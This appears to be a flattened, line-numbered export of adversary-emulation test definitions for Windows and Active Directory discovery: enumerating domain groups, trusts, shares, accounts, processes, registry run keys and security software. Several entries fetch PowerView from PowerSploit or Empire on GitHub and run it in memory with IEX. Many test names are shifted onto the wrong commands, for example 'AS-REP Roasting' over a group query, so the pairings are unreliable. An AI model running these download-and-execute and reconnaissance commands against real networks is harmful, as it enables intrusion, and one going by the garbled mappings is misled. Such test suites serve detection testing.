5475: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}]
5476: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [  executor:]
5477: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [    command: |]
5478: [- name: Adfind - Query Active Directory Groups] [attack_technique: T1069.002] [      #{adfind_path} -f (objectcategory=group)]
5481: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [    command: |]
5482: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [      Get-AdGroup -Filter *]
5483: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [  auto_generated_guid: 9f4e344b-8434-41b3-85b1-d38f29d148d0]
5484: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [    The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.]
5485: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [    Upon successful execution a listing of groups will output with their paths in AD.]
5486: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [    Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/]
5487: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [  supported_platforms:]
5488: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [  - windows]
5489: [- name: Enumerate Active Directory Groups with ADSISearcher] [attack_technique: T1069.002] [  executor:]
5492: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [    command: |]
5493: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [      ([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()]
5494: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [  auto_generated_guid: 43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8]
5495: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [    - windows]
5496: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [  dependency_executor_name: powershell]
5497: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [  dependencies:]
5498: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [  - description: |]
5499: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [      Computer must be domain joined.]
5500: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [    prereq_command: |]
5501: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}]
5502: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [    get_prereq_command: |]
5503: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [      Write-Host Joining this computer to a domain must be done manually.]
5504: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [  - description: |]
5505: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [      Requires the Active Directory module for powershell to be installed.]
5506: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [    prereq_command: |]
5507: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [      if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}]
5508: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [    get_prereq_command: |]
5509: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [      Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"]
5510: [- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)] [attack_technique: T1069.002] [  executor:]
5513: [- name: Get-DomainGroupMember with PowerView] [attack_technique: T1069.002] [    command: |]
5514: [- name: Get-DomainGroupMember with PowerView] [attack_technique: T1069.002] [      Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name]
5515: [- name: Get-DomainGroupMember with PowerView] [attack_technique: T1069.002] [  auto_generated_guid: 46352f40-f283-4fe5-b56d-d9a71750e145]
5516: [- name: Get-DomainGroupMember with PowerView] [attack_technique: T1069.002] [  - windows]
5517: [- name: Get-DomainGroupMember with PowerView] [attack_technique: T1069.002] [  executor:]
5518: [- name: Get-DomainGroupMember with PowerView] [attack_technique: T1069.002] [    command: |]
5519: [- name: Get-DomainGroupMember with PowerView] [attack_technique: T1069.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5520: [- name: Get-DomainGroupMember with PowerView] [attack_technique: T1069.002] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"]
5523: [- name: Get-DomainGroup with PowerView] [attack_technique: T1069.002] [    command: |]
5524: [- name: Get-DomainGroup with PowerView] [attack_technique: T1069.002] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5525: [- name: Get-DomainGroup with PowerView] [attack_technique: T1069.002] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose]
5528: [- name: Windows - Discover domain trusts with dsquery] [attack_technique: T1482] [    command: |]
5529: [- name: Windows - Discover domain trusts with dsquery] [attack_technique: T1482] [      dsquery * -filter "(objectClass=trustedDomain)" -attr *]
5532: [- name: Windows - Discover domain trusts with nltest] [attack_technique: T1482] [    command: |]
5533: [- name: Windows - Discover domain trusts with nltest] [attack_technique: T1482] [      nltest /domain_trusts]
5536: [- name: Powershell enumerate domains and forests] [attack_technique: T1482] [    command: |]
5537: [- name: Powershell enumerate domains and forests] [attack_technique: T1482] [      Import-Module "$env:TEMP\PowerView.ps1"]
5538: [- name: Powershell enumerate domains and forests] [attack_technique: T1482] [      Get-NetDomainTrust]
5539: [- name: Powershell enumerate domains and forests] [attack_technique: T1482] [      Get-NetForestTrust]
5540: [- name: Powershell enumerate domains and forests] [attack_technique: T1482] [      Get-ADDomain]
5541: [- name: Powershell enumerate domains and forests] [attack_technique: T1482] [      Get-ADGroupMember Administrators -Recursive]
5544: [- name: Adfind - Enumerate Active Directory OUs] [attack_technique: T1482] [    command: |]
5545: [- name: Adfind - Enumerate Active Directory OUs] [attack_technique: T1482] [      #{adfind_path} -f (objectcategory=organizationalUnit)]
5548: [- name: Adfind - Enumerate Active Directory Trusts] [attack_technique: T1482] [    command: |]
5549: [- name: Adfind - Enumerate Active Directory Trusts] [attack_technique: T1482] [      #{adfind_path} -gcb -sc trustdmp]
5552: [- name: Get-DomainTrust with PowerView] [attack_technique: T1482] [    command: |]
5553: [- name: Get-DomainTrust with PowerView] [attack_technique: T1482] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5554: [- name: Get-DomainTrust with PowerView] [attack_technique: T1482] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose]
5557: [- name: Get-ForestTrust with PowerView] [attack_technique: T1482] [    command: |]
5558: [- name: Get-ForestTrust with PowerView] [attack_technique: T1482] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5559: [- name: Get-ForestTrust with PowerView] [attack_technique: T1482] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose]
5562: [- name: File and Directory Discovery (cmd.exe)] [attack_technique: T1083] [    command: |]
5563: [- name: File and Directory Discovery (cmd.exe)] [attack_technique: T1083] [      dir /s c:\ >> %temp%\download]
5564: [- name: File and Directory Discovery (cmd.exe)] [attack_technique: T1083] [      dir /s "c:\Documents and Settings" >> %temp%\download]
5565: [- name: File and Directory Discovery (cmd.exe)] [attack_technique: T1083] [      dir /s "c:\Program Files\" >> %temp%\download]
5566: [- name: File and Directory Discovery (cmd.exe)] [attack_technique: T1083] [      dir "%systemdrive%\Users\*.*" >> %temp%\download]
5567: [- name: File and Directory Discovery (cmd.exe)] [attack_technique: T1083] [      dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download]
5568: [- name: File and Directory Discovery (cmd.exe)] [attack_technique: T1083] [      dir "%userprofile%\Desktop\*.*" >> %temp%\download]
5569: [- name: File and Directory Discovery (cmd.exe)] [attack_technique: T1083] [      tree /F >> %temp%\download]
5572: [- name: File and Directory Discovery (PowerShell)] [attack_technique: T1083] [    command: |]
5573: [- name: File and Directory Discovery (PowerShell)] [attack_technique: T1083] [      ls -recurse]
5574: [- name: File and Directory Discovery (PowerShell)] [attack_technique: T1083] [      get-childitem -recurse]
5575: [- name: File and Directory Discovery (PowerShell)] [attack_technique: T1083] [      gci -recurse]
5578: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [    command: |]
5579: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      $folderarray = @("Desktop", "Downloads", "Documents", "AppData/Local", "AppData/Roaming")]
5580: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}]
5581: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}]
5582: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      Get-ChildItem -Path "${env:ProgramFiles(x86)}" -erroraction silentlycontinue | Out-File -append #{File_to_output}]
5583: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      $UsersFolder = "$env:homedrive\Users\"]
5584: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ]
5585: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      {]
5586: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      foreach ($secondarydirectory in $folderarray)]
5587: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [       {Get-ChildItem -Path "$UsersFolder/$directory/$secondarydirectory" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}]
5588: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      }]
5589: [- name: Simulating MAZE Directory Enumeration] [attack_technique: T1083] [      cat #{File_to_output}]
5594: [- name: Get-DomainGPO to display group policy information via PowerView] [attack_technique: T1615] [    command: |]
5595: [- name: Get-DomainGPO to display group policy information via PowerView] [attack_technique: T1615] [      gpresult /z]
5596: [- name: Get-DomainGPO to display group policy information via PowerView] [attack_technique: T1615] []
5597: [- name: Get-DomainGPO to display group policy information via PowerView] [attack_technique: T1615] [  auto_generated_guid: 4e524c4e-0e02-49aa-8df5-93f3f7959b9f]
5598: [- name: Get-DomainGPO to display group policy information via PowerView] [attack_technique: T1615] [  supported_platforms:]
5599: [- name: Get-DomainGPO to display group policy information via PowerView] [attack_technique: T1615] [  - windows]
5600: [- name: Get-DomainGPO to display group policy information via PowerView] [attack_technique: T1615] [  executor:]
5601: [- name: Get-DomainGPO to display group policy information via PowerView] [attack_technique: T1615] [    command: powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"]
5616: [- name: Enumerate all accounts on Windows (Local)] [attack_technique: T1087.001] [    command: |]
5617: [- name: Enumerate all accounts on Windows (Local)] [attack_technique: T1087.001] [      net user]
5618: [- name: Enumerate all accounts on Windows (Local)] [attack_technique: T1087.001] [      dir c:\Users\]
5619: [- name: Enumerate all accounts on Windows (Local)] [attack_technique: T1087.001] [      cmdkey.exe /list]
5620: [- name: Enumerate all accounts on Windows (Local)] [attack_technique: T1087.001] [      net localgroup "Users"]
5621: [- name: Enumerate all accounts on Windows (Local)] [attack_technique: T1087.001] [      net localgroup]
5624: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [    command: |]
5625: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      net user]
5626: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      get-localuser]
5627: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      get-localgroupmember -group Users]
5628: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      cmdkey.exe /list]
5629: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      ls C:/Users]
5630: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      get-childitem C:\Users\]
5631: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      dir C:\Users\]
5632: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      get-localgroup]
5633: [- name: Enumerate all accounts via PowerShell (Local)] [attack_technique: T1087.001] [      net localgroup]
5636: [- name: Enumerate logged on users via CMD (Local)] [attack_technique: T1087.001] [    command: |]
5637: [- name: Enumerate logged on users via CMD (Local)] [attack_technique: T1087.001] [      query user]
5640: [- name: Basic Permission Groups Discovery Windows (Local)] [attack_technique: T1069.001] [    command: |]
5641: [- name: Basic Permission Groups Discovery Windows (Local)] [attack_technique: T1069.001] [      net localgroup]
5642: [- name: Basic Permission Groups Discovery Windows (Local)] [attack_technique: T1069.001] [      net localgroup "Administrators"]
5645: [- name: Permission Groups Discovery PowerShell (Local)] [attack_technique: T1069.001] [    command: |]
5646: [- name: Permission Groups Discovery PowerShell (Local)] [attack_technique: T1069.001] [      get-localgroup]
5647: [- name: Permission Groups Discovery PowerShell (Local)] [attack_technique: T1069.001] [      Get-LocalGroupMember -Name "Administrators"]
5650: [- name: Wmic Group Discovery] [attack_technique: T1069.001] [    command: |]
5651: [- name: Wmic Group Discovery] [attack_technique: T1069.001] [      New-Item -Path "#{output_path}" -ItemType Directory > $null]
5652: [- name: Wmic Group Discovery] [attack_technique: T1069.001] [      & "#{sharphound_path}" -d "#{domain}" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory "#{output_path}"]
5661: [- name: Wmic Group Discovery] [attack_technique: T1069.001] [    command: |]
5662: [- name: Wmic Group Discovery] [attack_technique: T1069.001] [      wmic.exe group get name]
5665: [- name: WMIObject Group Discovery] [attack_technique: T1069.001] [    command: |]
5666: [- name: WMIObject Group Discovery] [attack_technique: T1069.001] [      Get-WMIObject Win32_Group]
5673: [- name: Port Scan using python] [attack_technique: T1046] [    command: |]
5674: [- name: Port Scan using python] [attack_technique: T1046] [      python #{filename} -i #{host_ip}]
5701: [- name: Network Share Discovery command prompt] [attack_technique: T1135] [    command: |]
5702: [- name: Network Share Discovery command prompt] [attack_technique: T1135] [      net view \\#{computer_name}]
5705: [- name: Network Share Discovery PowerShell] [attack_technique: T1135] [    command: |]
5706: [- name: Network Share Discovery PowerShell] [attack_technique: T1135] [      get-smbshare]
5709: [- name: View available share drives] [attack_technique: T1135] [    command: |]
5710: [- name: View available share drives] [attack_technique: T1135] [      net share]
5713: [- name: Share Discovery with PowerView] [attack_technique: T1135] [    command: |]
5714: [- name: Share Discovery with PowerView] [attack_technique: T1135] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5715: [- name: Share Discovery with PowerView] [attack_technique: T1135] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose]
5718: [- name: PowerView ShareFinder] [attack_technique: T1135] [    command: |]
5719: [- name: PowerView ShareFinder] [attack_technique: T1135] [      Import-Module $env:TEMP\PowerView.ps1]
5720: [- name: PowerView ShareFinder] [attack_technique: T1135] [      Invoke-ShareFinder #{parameters}]
5729: [- name: Packet Capture Windows Command Prompt] [attack_technique: T1040] [    command: |]
5730: [- name: Packet Capture Windows Command Prompt] [attack_technique: T1040] [      "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5]
5733: [- name: Windows Internal pktmon capture] [attack_technique: T1040] [    command: |]
5734: [- name: Windows Internal pktmon capture] [attack_technique: T1040] [      pktmon.exe start --etw  -f %TEMP%\t1040.etl]
5735: [- name: Windows Internal pktmon capture] [attack_technique: T1040] [      TIMEOUT /T 5 >nul 2>&1]
5736: [- name: Windows Internal pktmon capture] [attack_technique: T1040] [      pktmon.exe stop]
5741: [- name: Windows Internal pktmon set filter] [attack_technique: T1040] [    command: |]
5742: [- name: Windows Internal pktmon set filter] [attack_technique: T1040] [      pktmon.exe filter add -p 445]
5747: [- name: Examine local password policy - Windows] [attack_technique: T1201] [    command: |]
5748: [- name: Examine local password policy - Windows] [attack_technique: T1201] [      net accounts]
5751: [- name: Examine domain password policy - Windows] [attack_technique: T1201] [    command: |]
5752: [- name: Examine domain password policy - Windows] [attack_technique: T1201] [      net accounts /domain]
5755: [- name: Get-DomainPolicy with PowerView] [attack_technique: T1201] [    command: |]
5756: [- name: Get-DomainPolicy with PowerView] [attack_technique: T1201] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5757: [- name: Get-DomainPolicy with PowerView] [attack_technique: T1201] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose]
5773: [- name: Process Discovery - tasklist] [attack_technique: T1057] [    command: |]
5774: [- name: Process Discovery - tasklist] [attack_technique: T1057] [      tasklist]
5777: [- name: Process Discovery - Get-Process] [attack_technique: T1057] [    command: |]
5778: [- name: Process Discovery - Get-Process] [attack_technique: T1057] [      Get-Process]
5781: [- name: Process Discovery - get-wmiObject] [attack_technique: T1057] [    command: |]
5782: [- name: Process Discovery - get-wmiObject] [attack_technique: T1057] [      get-wmiObject -class Win32_Process]
5785: [- name: Process Discovery - wmic process] [attack_technique: T1057] [    command: |]
5786: [- name: Process Discovery - wmic process] [attack_technique: T1057] [      wmic process get /format:list]
5789: [- name: Query Registry] [attack_technique: T1012] [    command: |]
5790: [- name: Query Registry] [attack_technique: T1012] [      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"]
5791: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
5792: [- name: Query Registry] [attack_technique: T1012] [      reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
5793: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices]
5794: [- name: Query Registry] [attack_technique: T1012] [      reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices]
5795: [- name: Query Registry] [attack_technique: T1012] [      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"]
5796: [- name: Query Registry] [attack_technique: T1012] [      reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"]
5797: [- name: Query Registry] [attack_technique: T1012] [      reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"]
5798: [- name: Query Registry] [attack_technique: T1012] [      reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"]
5799: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad]
5800: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce]
5801: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx]
5802: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run]
5803: [- name: Query Registry] [attack_technique: T1012] [      reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run]
5804: [- name: Query Registry] [attack_technique: T1012] [      reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce]
5805: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run]
5806: [- name: Query Registry] [attack_technique: T1012] [      reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run]
5807: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"]
5808: [- name: Query Registry] [attack_technique: T1012] [      reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run]
5811: [- name: Remote System Discovery - net] [attack_technique: T1018] [    command: |]
5812: [- name: Remote System Discovery - net] [attack_technique: T1018] [      net view /domain]
5813: [- name: Remote System Discovery - net] [attack_technique: T1018] [      net view]
5816: [- name: Remote System Discovery - net group Domain Computers] [attack_technique: T1018] [    command: |]
5817: [- name: Remote System Discovery - net group Domain Computers] [attack_technique: T1018] [      net group "Domain Computers" /domain]
5820: [- name: Remote System Discovery - nltest] [attack_technique: T1018] [    command: |]
5821: [- name: Remote System Discovery - nltest] [attack_technique: T1018] [      nltest.exe /dclist:#{target_domain}]
5824: [- name: Remote System Discovery - ping sweep] [attack_technique: T1018] [    command: |]
5825: [- name: Remote System Discovery - ping sweep] [attack_technique: T1018] [      for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i]
5828: [- name: Remote System Discovery - arp] [attack_technique: T1018] [    command: |]
5829: [- name: Remote System Discovery - arp] [attack_technique: T1018] [      arp -a]
5832: [- name: Remote System Discovery - nslookup] [attack_technique: T1018] [    command: |]
5833: [- name: Remote System Discovery - nslookup] [attack_technique: T1018] [      $localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]]
5834: [- name: Remote System Discovery - nslookup] [attack_technique: T1018] [      $pieces = $localip.split(".")]
5835: [- name: Remote System Discovery - nslookup] [attack_technique: T1018] [      $firstOctet = $pieces[0]]
5836: [- name: Remote System Discovery - nslookup] [attack_technique: T1018] [      $secondOctet = $pieces[1]]
5837: [- name: Remote System Discovery - nslookup] [attack_technique: T1018] [      $thirdOctet = $pieces[2]]
5838: [- name: Remote System Discovery - nslookup] [attack_technique: T1018] [      foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}]
5841: [- name: Remote System Discovery - adidnsdump] [attack_technique: T1018] [    command: |]
5842: [- name: Remote System Discovery - adidnsdump] [attack_technique: T1018] [      adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}]
5845: [- name: Adfind - Enumerate Active Directory Computer Objects] [attack_technique: T1018] [    command: |]
5846: [- name: Adfind - Enumerate Active Directory Computer Objects] [attack_technique: T1018] [      #{adfind_path} -f (objectcategory=computer)]
5849: [- name: Adfind - Enumerate Active Directory Domain Controller Objects] [attack_technique: T1018] [    command: |]
5850: [- name: Adfind - Enumerate Active Directory Domain Controller Objects] [attack_technique: T1018] [      #{adfind_path} -sc dclist]
5853: [- name: Enumerate domain computers within Active Directory using DirectorySearcher] [attack_technique: T1018] [    command: |]
5854: [- name: Enumerate domain computers within Active Directory using DirectorySearcher] [attack_technique: T1018] [      $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")]
5855: [- name: Enumerate domain computers within Active Directory using DirectorySearcher] [attack_technique: T1018] [      $DirectorySearcher.PropertiesToLoad.Add("Name")]
5856: [- name: Enumerate domain computers within Active Directory using DirectorySearcher] [attack_technique: T1018] [      $Computers = $DirectorySearcher.findall()]
5857: [- name: Enumerate domain computers within Active Directory using DirectorySearcher] [attack_technique: T1018] [      foreach ($Computer in $Computers) {]
5858: [- name: Enumerate domain computers within Active Directory using DirectorySearcher] [attack_technique: T1018] [        $Computer = $Computer.Properties.name]
5859: [- name: Enumerate domain computers within Active Directory using DirectorySearcher] [attack_technique: T1018] [        if (!$Computer) { Continue }]
5860: [- name: Enumerate domain computers within Active Directory using DirectorySearcher] [attack_technique: T1018] [        Write-Host $Computer}]
5863: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [    command: |]
5864: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [      Get-AdComputer -Filter *]
5865: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [  auto_generated_guid: 64ede6ac-b57a-41c2-a7d1-32c6cd35397d]
5866: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [    The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.]
5867: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [    Upon successful execution a listing of computers will output with their paths in AD.]
5868: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [    Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/]
5869: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [  supported_platforms:]
5870: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [  - windows]
5871: [- name: Enumerate Active Directory Computers with ADSISearcher] [attack_technique: T1018] [  executor:]
5874: [- name: Get-DomainController with PowerView] [attack_technique: T1018] [    command: |]
5875: [- name: Get-DomainController with PowerView] [attack_technique: T1018] [      ([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()]
5876: [- name: Get-DomainController with PowerView] [attack_technique: T1018] [  auto_generated_guid: b9d2e8ca-5520-4737-8076-4f08913da2c4]
5877: [- name: Get-DomainController with PowerView] [attack_technique: T1018] [  - windows]
5878: [- name: Get-DomainController with PowerView] [attack_technique: T1018] [  executor:]
5879: [- name: Get-DomainController with PowerView] [attack_technique: T1018] [    command: |]
5880: [- name: Get-DomainController with PowerView] [attack_technique: T1018] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
5881: [- name: Get-DomainController with PowerView] [attack_technique: T1018] [      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose]
5884: [- name: Security Software Discovery] [attack_technique: T1518.001] [    command: |]
5885: [- name: Security Software Discovery] [attack_technique: T1518.001] [      netsh.exe advfirewall  show allprofiles]
5886: [- name: Security Software Discovery] [attack_technique: T1518.001] [      tasklist.exe]
5887: [- name: Security Software Discovery] [attack_technique: T1518.001] [      tasklist.exe | findstr /i virus]
5888: [- name: Security Software Discovery] [attack_technique: T1518.001] [      tasklist.exe | findstr /i cb]
5889: [- name: Security Software Discovery] [attack_technique: T1518.001] [      tasklist.exe | findstr /i defender]
5890: [- name: Security Software Discovery] [attack_technique: T1518.001] [      tasklist.exe | findstr /i cylance]
5893: [- name: Security Software Discovery - powershell] [attack_technique: T1518.001] [    command: |]
5894: [- name: Security Software Discovery - powershell] [attack_technique: T1518.001] [      get-process | ?{$_.Description -like "*virus*"}]
5895: [- name: Security Software Discovery - powershell] [attack_technique: T1518.001] [      get-process | ?{$_.Description -like "*carbonblack*"}]
5896: [- name: Security Software Discovery - powershell] [attack_technique: T1518.001] [      get-process | ?{$_.Description -like "*defender*"}]
5897: [- name: Security Software Discovery - powershell] [attack_technique: T1518.001] [      get-process | ?{$_.Description -like "*cylance*"}]
5900: [- name: Security Software Discovery - Sysmon Service] [attack_technique: T1518.001] [    command: |]
5901: [- name: Security Software Discovery - Sysmon Service] [attack_technique: T1518.001] [      fltmc.exe | findstr.exe 385201]
5904: [- name: Find and Display Internet Explorer Browser Version] [attack_technique: T1518] [    command: |]
5905: [- name: Find and Display Internet Explorer Browser Version] [attack_technique: T1518] [      reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer" /v svcVersion]
5908: [- name: Applications Installed] [attack_technique: T1518] [    command: |]
5909: [- name: Applications Installed] [attack_technique: T1518] [      Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize]
5910: [- name: Applications Installed] [attack_technique: T1518] [      Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize]
5913: [- name: WinPwn - Dotnetsearch] [attack_technique: T1518] [    command: |]
